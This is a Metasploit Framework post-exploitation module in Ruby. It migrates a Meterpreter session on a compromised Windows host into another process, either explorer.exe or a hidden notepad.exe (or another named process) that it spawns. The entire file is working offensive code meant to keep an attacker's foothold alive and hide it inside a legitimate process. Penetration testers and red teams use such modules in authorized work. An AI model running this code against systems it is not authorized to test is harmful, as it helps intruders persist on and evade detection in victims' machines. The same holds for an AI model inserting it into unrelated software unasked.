##
# $Id$
##

##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'


class Metasploit3 < Msf::Post



	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Process Migrate',
				'Description'   => %q{ This module will migrate a Meterpreter session from one process to another.
					A given process name can be given to migrate to or the module can spawn one
					and migrate to that newly spawned process.},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
				'Version'       => '$Revision$',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))
		register_options(
			[
				OptBool.new('SPAWN', [ false, 'Description', false]),
				OptString.new('NAME', [false, 'Description', nil]),


			], self.class)
	end

	# Run Method for when run command is issued
	def run
		print_status("Running module against #{sysinfo['Computer']}")
		server = client.sys.process.open

		print_status("Current server process: #{server.name} (#{server.pid})")

		target_pid = nil

		if ! datastore['SPAWN']
			# Get the target process name
			if datastore['NAME'] =~ /\.exe/
				target = datastore['NAME']
			else
				target = "explorer.exe"
			end
			print_status("Migrating to #{target}...")

			# Get the target process pid
			target_pid = client.sys.process[target]

			if not target_pid
				print_error("Could not access the target process")
				print_status("Spawning a notepad.exe host process...")
				note = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true })
				target_pid = note.pid
			end
		else
			if datastore['NAME'] =~ /\.exe/
				target = datastore['NAME']
			else
				target = "notepad.exe"
			end
			print_status("Spawning a #{target} host process...")
			newproc = client.sys.process.execute(target, nil, {'Hidden' => true })
			target_pid = newproc.pid
			if not target_pid
				print_error("Could not create a process around #{target}")
				raise Rex::Script::Completed
			end
		end

		# Do the migration
		print_status("Migrating into process ID #{target_pid}")
		client.core.migrate(target_pid)
		server = client.sys.process.open
		print_status("New server process: #{server.name} (#{server.pid})")

	end
end